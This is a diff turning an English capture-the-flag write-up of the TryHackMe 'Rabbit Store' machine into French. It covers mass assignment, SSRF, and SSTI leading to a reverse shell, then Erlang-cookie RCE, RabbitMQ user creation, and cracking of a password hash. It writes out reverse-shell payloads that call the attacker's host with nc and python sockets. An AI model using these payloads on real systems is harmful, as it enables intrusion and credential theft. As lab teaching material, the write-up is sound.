@@ -15,7 +15,7 @@ type: "post"
 * OS: Linux
 ---
 
-Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass assignment vulnerability in an API, which is then leveraged alongside an SSRF vulnerability to retrieve the API documentation. One of the discovered endpoints is vulnerable to SSTI, allowing us to gain initial access to the target system. Through enumeration, we uncover an Erlang cookie, enabling us to pivot to another user. From there, we escalate our privileges by creating an admin user in RabbitMQ and exporting a file containing sensitive information, including the root user’s password hash. By properly formatting the hash, we ultimately retrieve the root password and achieve full system compromise.
+Rabbit Store présente quelques services peu communs. Le défi commence par l'identification d'une vulnérabilité d'assignation de masse dans une API, qui est ensuite exploitée avec une vulnérabilité SSRF pour récupérer la documentation de l'API. L'un des endpoints découverts est vulnérable au SSTI, ce qui nous permet d'obtenir un accès initial au système cible. Grâce à l'énumération, nous découvrons un cookie Erlang, ce qui nous permet de pivoter vers un autre utilisateur. Ensuite, nous escaladons nos privilèges en créant un utilisateur admin dans RabbitMQ et en exportant un fichier contenant des informations sensibles, y compris le hachage du mot de passe de l'utilisateur root. En formatant correctement le hachage, nous récupérons finalement le mot de passe de l'utilisateur root et parvenons à compromettre complètement le système.
 
 ## Balayage
 
@@ -64,53 +64,53 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1250.63 seconds
 ```
 
-We find four open ports with Nmap:
-- 22 running SSH 
-- 80 running http, with a redirection to `cloudsite.thm`
-- 4369 running epmd
-- 25672 (this is the Erlang Distribution port, used for RabbitMQ clustering)
+Nmap découvre quatre ports ouverts:
+- 22 avec SSH 
+- 80 avec http, avec une redirection vers `cloudsite.thm`
+- 4369 avec epmd
+- 25672 (c'est le port de distribution Erlang, utilisé pour le clustering RabbitMQ)
 
-> the `epmd` service (Erlang Port Mapper Daemon) is used by Erlang applications to discover each other on a network. 
-> _Read more about the service [here](https://www.erlang.org/docs/26/man/epmd)._
+> Le service `epmd` (Erlang Port Mapper Daemon) est utilisé par les applications Erlang pour se découvrir mutuellement sur un réseau.
+> _Plus d'informations sur le service [ici](https://www.erlang.org/docs/26/man/epmd)._
 
-## Enumeration
+## Enumération
 
-We use `nc -vz {TARGET_IP} 25672` to verify the status of `RabbitMQ`.
+Nous utilisons `nc -vz {TARGET_IP} 25672` pour vérifier le statut de `RabbitMQ`.
 
 ![RabbitMQ service test](/images/THM-RabbitStore/rabbitMQ_test.png)
 
-The output strongly suggests that `RabbitMQ` is running on the target. 
+La réponse semble indiquer que `RabbitMQ` est en cours d'exécution sur la cible. 
 
-> RabbitMQ is an open-source message broker that implements the Advanced Message Queuing Protocol (AMQP). It is used for asynchronous communication between applications, enabling them to send and receive messages without direct interaction.
-> _Learn more about it [here](https://www.rabbitmq.com/)._
+> RabbitMQ est un gestionnaire de messages open-source qui implémente le protocole AMQP (Advanced Message Queuing Protocol). Il est utilisé pour la communication asynchrone entre les applications, leur permettant d'envoyer et de recevoir des messages.
+> _Pour en savoir plus, cliquez [ici](https://www.rabbitmq.com/)._
 
-At `http://cloudsite.thm` we find a website for a company providing cloud services.
+À l'adresse `http://cloudsite.thm`, nous trouvons le site web d'une entreprise fournissant des services cloud.
 
 ![clousite website](/images/THM-RabbitStore/website_RabbitStore.png)
 
-When trying to create an account we get redirected to `http://storage.cloudsite.thm/register.html`, we need to update the `/etc/hosts` file in order to access it.
+Lorsque nous essayons de créer un compte, nous sommes redirigés vers `http://storage.cloudsite.thm/register.html`, nous devons mettre à jour le fichier `/etc/hosts` afin d'y accéder.
 
 ![clousite signup page](/images/THM-RabbitStore/signup_page.png)
 
-We create an account and try logging in, but we receive a message telling us that our account need to be activated at `http://storage.cloudsite.thm/dashboard/inactive`. 
+Nous créons un compte et essayons de nous connecter, mais nous recevons un message nous indiquant que notre compte doit être activé à `http://storage.cloudsite.thm/dashboard/inactive`. 
 
 ![account activation](/images/THM-RabbitStore/account_activation.png)
 
-Noticing the `inactive` at the end of the url, we change it to active and get the message: `Your subscription is inactive. You cannot use our services.`. This seems to be an API endpoint.
+Remarquant la mention `inactive` à la fin de l'url, nous la remplaçons par `active` et obtenons le message suivant: `Your subscription is inactive. You cannot use our services.`. Il semble s'agir d'un point de terminaison d'API.
 
 ![API inactive](/images/THM-RabbitStore/api_inactive_.png)
 
-We login again and intercept the request this time. We see a POST request to `/api/login`. Its response contains a JWT (JSON Web Token), and we can see the `inactive` at the end (the current status of our account/subscription).
+Nous nous connectons à nouveau et interceptons la requête cette fois-ci. Nous voyons une requête POST vers `/api/login`. Sa réponse contient un JWT (JSON Web Token), et nous pouvons voir le `inactive` à la fin (le statut actuel de notre compte/abonnement).
 
 ![POST request to /api/login](/images/THM-RabbitStore/JWT_login.png)
 
-Let's try to find more API endpoints with ffuf.
+Essayons de trouver d'autres points de terminaison d'API avec ffuf.
 
 ```
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://storage.cloudsite.thm/api/FUZZ -ic -fc 404
 ```
 
-We discover a few more but we cannot access the last two:
+Nous en découvrons d'autres, mais nous ne pouvons pas accéder aux deux derniers:
 * `/register`
 * `/docs`
 * `/uploads`
@@ -121,35 +121,35 @@ We discover a few more but we cannot access the last two:
 
 ![access denied to /api/uploads](/images/THM-RabbitStore/api_uploads.png)
 
-### Mass Assignment vulnerability
+### Vulnérabilité Mass Assignment
 
-We use [jwt.io](https://jwt.io/) to analyze the token. We indeed see that our subscription is marked as `inactive` in the decoded payload.
+Nous utilisons [jwt.io](https://jwt.io/) pour analyser le jeton. Nous voyons en effet que notre abonnement est marqué comme `inactif` dans le payload décodé.
 
 ![decoded JWT](/images/THM-RabbitStore/decoded_JWT.png)
 
-We register an account and manually add `"subscription":"active"` to the POST request to `/api/register`.
+Nous enregistrons un compte et ajoutons manuellement `"subscription":"active"` à la requête POST vers `/api/register`.
 
 ![mass assignment vulnerability](/images/THM-RabbitStore/mass_assign.png)
 
-Our request is successful!
+Notre requête est acceptée!
 
 ![mass assignment vulnerability successful](/images/THM-RabbitStore/mass_assign1.png)
 
 We login and now have access to `http://storage.cloudsite.thm/dashboard/active`, where we find a file upload feature.
 
-> The vulnerability we exploited is known as a mass assignment vulnerability. It occurs when an API allows the modification of fields that should not be directly manipulated by users, such as sensitive or internal attributes. 
+> La vulnérabilité que nous avons exploitée est connue sous le nom de vulnérabilité du type `mass assignment` (affectation de masse). Elle se produit lorsqu'une API permet la modification de champs qui ne devraient pas être directement manipulés par les utilisateurs, tels que des attributs sensibles ou internes.
 
-### Exploiting SSRF
+### Exploitation du SSRF
 
-We can upload a file from our computer or from an url.
+Nous pouvons uploader un fichier à partir de notre ordinateur ou depuis une URL.
 
 ![access to /dashboard/active](/images/THM-RabbitStore/dashboard_active.png)
 
 ![upload files from url option](/images/THM-RabbitStore/upload_url.png)
 
-A feature accepting a user submitted URL can possibly mean an SSRF vulnerability so let's test that.
+Une fonctionnalité acceptant une URL soumise par l'utilisateur peut potentiellement signifier une vulnérabilité SSRF, alors testons là.
 
-We create a test file and start a python server on our local machine.
+Nous créons un fichier de test et démarrons un serveur python sur notre machine locale.
 
 ```
 echo 'let_me_in' > SSRF_test.txt
@@ -159,8 +159,7 @@ python3 -m http.server
 
 ![SSRF vulnerability test](/images/THM-RabbitStore/SSRF_vuln_test.png)
 
-On the website we enter the url for our web server
-
+Sur le site web, nous entrons l'url de notre serveur web.
 
 ```
 http://{YOUR_IP}:{PORT}/{FILENAME}
@@ -168,42 +167,42 @@ http://{YOUR_IP}:{PORT}/{FILENAME}
 
 ![file submission via url](/images/THM-RabbitStore/url_sub.png)
 
-It works, we receive a request on our web server and the file is successfully uploaded on the target.
+La procédure fonctionne, nous recevons une demande sur notre serveur web et le fichier est téléchargé avec succès sur la cible.
 
 ![http 200 on web server](/images/THM-RabbitStore/ssrf_200.png)
 
 ![file successfully stored on the target](/images/THM-RabbitStore/upload.png)
 
-After refreshing the page we can see it under `Uploaded Files`.
+Après avoir rafraîchi la page, nous pouvons le voir sous la rubrique `Uploaded Files` (Fichiers téléchargés).
 
 ![uploaded file list](/images/THM-RabbitStore/uploaded_files.png)
 
-When we click on the file link under `Uploaded Files`, there is a GET request sent to `/api/uploads/xxxxxxxxx`. This is used to download files.
+Lorsque nous cliquons sur le lien du fichier sous `Uploaded Files`, une requête GET est envoyée à `/api/uploads/xxxxx`. Cette requête est utilisée pour télécharger les fichiers.
 
 ![GET request to /api/uploads](/images/THM-RabbitStore/api_uploads_req.png)
 
-Also we can now access `http://storage.cloudsite.thm/api/uploads`.
+Nous pouvons à présent accéder à `http://storage.cloudsite.thm/api/uploads`.
 
 ![successful access to /api/uploads](/images/THM-RabbitStore/api_uploads_access.png)
 
-The URL upload function sends a request to `/api/store-url`.
+La fonction de téléversement via URL envoie une requête à `/api/store-url`.
 
 ![request to /api/store-url](/images/THM-RabbitStore/api_store_url.png)
 
-We will try to access `/api/docs` via the SSRF.
+Nous allons essayer d'accéder à `/api/docs` par le biais du SSRF.
 
 ![Attempt to access /api/docs via SSRF](/images/THM-RabbitStore/SSRF_api_docs_1.png)
 
-The request is successful but the file downloaded only contains a `404` error.
+La requête est réussie mais le fichier téléchargé ne contient qu'une erreur `404`.
 
 ![downloaded file contains 404 error](/images/THM-RabbitStore/404_file_dl.png)
 
 #### Balayage des ports internes via SSRF
 
-Let's try to find some internal open ports on the target.
+Essayons de trouver des ports internes ouverts sur la cible.
 
-> The same method is used in [THM: Creative](https://scorpiosec.com/fr/posts/thm-creative/#balayage-des-ports-internes-via-ssrf).
-> All these parameters are from the POST request to `/api/store-url`.
+> La même méthode est utilisée dans [THM: Creative](https://scorpiosec.com/fr/posts/thm-creative/#balayage-des-ports-internes-via-ssrf).
+> Tous ces paramètres proviennent de la requête POST vers `/api/store-url`.
 
 ```
 ffuf -u "http://storage.cloudsite.thm/api/store-url" \
@@ -217,11 +216,11 @@ ffuf -u "http://storage.cloudsite.thm/api/store-url" \
 -fs 41
 ```
 
-We discover a few ports.
+Nous découvrons quelques ports.
 
 ![Internal port scan via SSRF](/images/THM-RabbitStore/SSRF_internal_ports.png)
 
-We will try to reach `/api/docs`.
+Nous allons essayer d'atteindre `/api/docs`.
 
 ```
 http://127.0.0.1:3000/api/docs
@@ -229,47 +228,47 @@ http://127.0.0.1:3000/api/docs
 
 ![second attempt to access /api/docs](/images/THM-RabbitStore/api_docs_upload.png)
 
-This time we get the correct file, detailing all the API endpoints. We already knew most of them, the new one is `/api/fetch_messeges_from_chatbot`.
+Cette fois, nous obtenons le bon fichier, détaillant tous les points de terminaison de l'API. Nous connaissions déjà la plupart d'entre eux, le nouveau est `/api/fetch_messeges_from_chatbot`.
 
 ![Successfully retrieve /api/docs](/images/THM-RabbitStore/api_docs_file.png)
 
-### Exploiting SSTI 
+### Exploitation du SSTI 
 
-The file tells us that we need to use a POST request to access it. So let's first capture the request to `http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot`.
+Le fichier nous indique que nous devons utiliser une requête POST pour y accéder. Commençons donc par capturer la requête vers `http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot`.
 
-As expected we get `GET method not allowed`.
+Comme attendu, nous obtenons `GET method not allowed`.
 
 ![GET request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/GET_chatbot.png)
 
-We change it to a POST request a send it again, now we have a 500 error.
+Nous la transformons en requête POST et l'envoyons à nouveau. Nous obtenons alors une erreur 500.
 
 ![http 500 error to POST request](/images/THM-RabbitStore/internal_error_chatbot.png)
 
-Since we are interacting with the API let's add `Content-Type: application/json` to our request and try to send some random parameters.
+Puisque nous interagissons avec l'API, ajoutons `Content-Type : application/json` à notre requête et essayons d'envoyer quelques paramètres aléatoires.
 
 ![username parameter required](/images/THM-RabbitStore/custom_req_chatbot.png)
 
-It tells us that a username parameter is required. After adding it, we are told that the chatbot is under development. We notice that the answer includes the username we sent and any different name produces the same response.
+Il nous indique qu'un paramètre username (nom d'utilisateur) est nécessaire. Après l'avoir ajouté, on nous dit que le chatbot est en cours de développement. Nous remarquons que la réponse inclut le nom d'utilisateur que nous avons envoyé et que tout nom différent produit la même réponse.
 
-There is probably some kind of template akin to this: `Sorry, $username, our chatbot server is currently under development.`
+Il y a probablement une sorte de modèle utilisé en arrière-plan qui ressemble à ceci: `Sorry, $username, our chatbot server is currently under development.` (Désolé, $username, notre serveur de chatbot est actuellement en cours de développement).
 
 ![successful POST request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/chatbot_response.png)
 
-We will test for an SSTI (Server Side Template Injection) vulnerability. On [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify) we find plenty of payloads.
+Nous allons tester une vulnérabilité SSTI (Server Side Template Injection). Sur [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify) nous trouvons de nombreux payloads.
 
-The payload is indeed executed!
+Le payload est bel et bien exécuté!
 
 ![SSTI confirmed](/images/THM-RabbitStore/SSTI_confirmed.png)
 
-## Initial Foothold (shell as azrael)
+## Accès initial (shell en tant que azrael)
 
-Although the payload works I am wondering why that is the case :thinking:.
+Bien que le payload fonctionne, je me demande pourquoi c'est le cas :thinking:.
 
-Because this application uses the Express framework and `{{7*7}}` is a payload for `Jinja2 (Python)`.
+Parce que cette application utilise le framework Express et `{{7*7}}` est un payload pour `Jinja2 (Python)`.
 
 ![Rabbit Store tech stack](/images/THM-RabbitStore/rabbit_store_techstack.png)
 
-We attempt to gain a reverse shell with the following payload:
+Nous tentons d'obtenir un shell inversé avec le payload suivant:
 
 ```
 {{ config.__class__.__init__.__globals__['os'].system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f') }}
@@ -277,7 +276,7 @@ We attempt to gain a reverse shell with the following payload:
 
 ![SSTI for RCE](/images/THM-RabbitStore/SSTI_RCE.png)
 
-After sending the request we get a shell as `azrael` on our listener. We can also upgrade the shell with the commands below.
+Après avoir envoyé la requête, nous obtenons un shell sous le nom de `azrael` sur notre listener. Nous pouvons également améliorer le shell avec les commandes ci-dessous.
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'  
@@ -289,16 +288,15 @@ stty rows 38 columns 116
 
 ![foothold and user flag](/images/THM-RabbitStore/user_flag.png)
 
-### Shell as rabbitmq
+### Shell en tant que rabbitmq
 
-Linpeas finds an Erlang file called `.erlang.cookie` in `/var/lib/rabbitmq/`. The file is owned by the `rabbitmq` user.
+Linpeas trouve un fichier Erlang appelé `.erlang.cookie` dans `/var/lib/rabbitmq/`. Le fichier appartient à l'utilisateur `rabbitmq`.
 
 ![Erlang file found](/images/THM-RabbitStore/erlang_file.png)
 
-We recall from our nmap scan that we found ports `4369` and `25672` open.
+Nous nous souvenons que notre scan nmap a trouvé les ports `4369` et `25672` ouverts.
 
-On [this HackTricks page](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection) we learn a few methods to achieve RCE using the Erlang cookie. However we need to slightly modify the command, instead of `couchdb@localhost` we use `rabbit@forge` (forge is the target hostname).
-
+Sur [cette page HackTricks](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection), nous apprenons quelques méthodes pour obtenir un RCE en utilisant le cookie Erlang. Cependant, nous devons modifier légèrement la commande, au lieu de `couchdb@localhost` nous utilisons `rabbit@forge` (forge est le nom de l'hôte cible).
 ```
 HOME=/ erl -sname kscorpio -setcookie CCOKIE_FOUND
 
@@ -308,11 +306,11 @@ rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=so
 
 ![Erlang Cookie RCE](/images/THM-RabbitStore/erl_rce.png)
 
-On our listener we now have a shell as `rabbitmq`.
+Sur notre listener, nous avons maintenant un shell sous le nom de `rabbitmq`.
 
 ![rabbitmq shell](/images/THM-RabbitStore/rabbitmq_shell.png)
 
-Now that we are `rabbitmq` we can use `rabbitmqctl`. We first try `list_users` but it returns an error.
+Maintenant que nous sommes `rabbitmq`, nous pouvons utiliser `rabbitmqctl`. Nous essayons d'abord `list_users` mais il renvoie une erreur.
 
 ```
 rabbitmqctl list_users
@@ -320,7 +318,7 @@ rabbitmqctl list_users
 
 ![failed rabbitmq list_users command](/images/THM-RabbitStore/list_users.png)
 
-We can correct the file permissions and run the command again.
+Nous corrigeons les permissions du fichier et exécutons à nouveau la commande.
 
 ```
 chmod 400 /var/lib/rabbitmq/.erlang.cookie
@@ -328,15 +326,17 @@ chmod 400 /var/lib/rabbitmq/.erlang.cookie
 
 ![successful rabbitmq list_users command](/images/THM-RabbitStore/rabbitmq_list_users.png)
 
-We get the message:
+Nous obtenons le message:
 
 ```
 The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.
 ```
 
-## Privilege Escalation (shell as root)
+> Le mot de passe de l'utilisateur root est la valeur SHA-256 du mot de passe de l'utilisateur root de RabbitMQ. N'essayez pas de craquer SHA-256.
 
-We learn [here](https://www.rabbitmq.com/docs/definitions) that RabbitMQ stores information in `definitions`, these files can be exported as a JSON file. We can abuse our privileges to create a new user and do just that.
+## Escalade des privilèges (shell en tant que root)
+
+[Cette page](https://www.rabbitmq.com/docs/definitions) nous apprends que RabbitMQ stocke les informations dans des `définitions`, ces fichiers peuvent être exportés sous forme de fichier JSON. Nous pouvons abuser de nos privilèges pour créer un nouvel utilisateur et réaliser cette opération.
 
 ```
 rabbitmqctl add_user kscorpio kscorpio 
@@ -347,11 +347,11 @@ rabbitmqadmin export rabbit.definitions.json -u kscorpio -p kscorpio
 
 ![rabbitmq export definitions](/images/THM-RabbitStore/rabbitmq_privesc.png)
 
-Inside the file we find the root password hash.
+À l'intérieur du fichier, nous trouvons le hachage du mot de passe root.
 
 ![root password hash in json file](/images/THM-RabbitStore/rabbitmq_pwd_hash.png)
 
-To crack a RabbitMQ hash with a tool like hashcat we need to format it first. On [this Github issue page](https://github.com/QKaiser/cottontail/issues/27) we learn how to do it. 
+Pour craquer un hash RabbitMQ avec un outil tel que hashcat, nous devons d'abord le formater. Sur [cette page Github](https://github.com/QKaiser/cottontail/issues/27), nous apprenons comment le faire. 
 
 ```
 echo "RABBITMQ_HASH" | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
@@ -360,23 +360,22 @@ echo "RABBITMQ_HASH" | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1
 hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-> For our case we do not need the second step.
+> Dans notre cas, nous n'avons pas besoin de la deuxième étape.
 
-The documentation [here](https://www.rabbitmq.com/docs/passwords#hash-via-http-api) let us know that the hashes use a `32 bit` (4 bytes) salt and we know that: "the password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password".
+La documentation disponible [ici](https://www.rabbitmq.com/docs/passwords#hash-via-http-api) nous indique que les hashs utilisent un sel de `32 bit` (4 octets) et nous savons que : "le mot de passe de l'utilisateur root est la valeur SHA-256 du mot de passe de l'utilisateur root de RabbitMQ".
 
-So the password is simply all the characters minus the salt (our formatted hash has already separated the two for us). We use it and are able to read the root flag.
+Le mot de passe est donc simplement constitué de tous les caractères moins le sel (notre hachage formaté sépare les deux pour nous). Nous l'utilisons et sommes en mesure de lire le drapeau root.
 
 ![root password](/images/THM-RabbitStore/root_pwd.png)
 
-
 ![access to the root account](/images/THM-RabbitStore/root_flag.png)
 
-## Additional Resources
+## Ressources complémentaires
 
-This room is a great introduction to some novel exploitation (at least for me). Below are some additional resources to practice the featured vulnerabilities:
+Merci d'avoir pris le temps de lire cet article. Cette room est une excellente introduction à de nouvelles exploitations (du moins pour moi). Vous trouverez ci-dessous des ressources supplémentaires (et gratuites) pour vous exercer aux vulnérabilités présentées:
 
-* Learn about mass assignment vulnerabilities with PortSwigger [here](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability).
-* Learn about [SSRF](https://portswigger.net/web-security/ssrf) and [SSTI](https://portswigger.net/web-security/server-side-template-injection) from PortSwigger.
-* Erlang Cookie RCE methods are available [here](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection).
+* Apprendre à exploiter les vulnérabilités mass assignment avec PortSwigger [ici](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability).
+* En apprendre plus sur le [SSRF](https://portswigger.net/web-security/ssrf) et le [SSTI](https://portswigger.net/web-security/server-side-template-injection) avec PortSwigger.
+* Les méthodes permettant d'obtenir un RCE en abusant du cookie Erlang sont disponibles [here](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection).
 
 
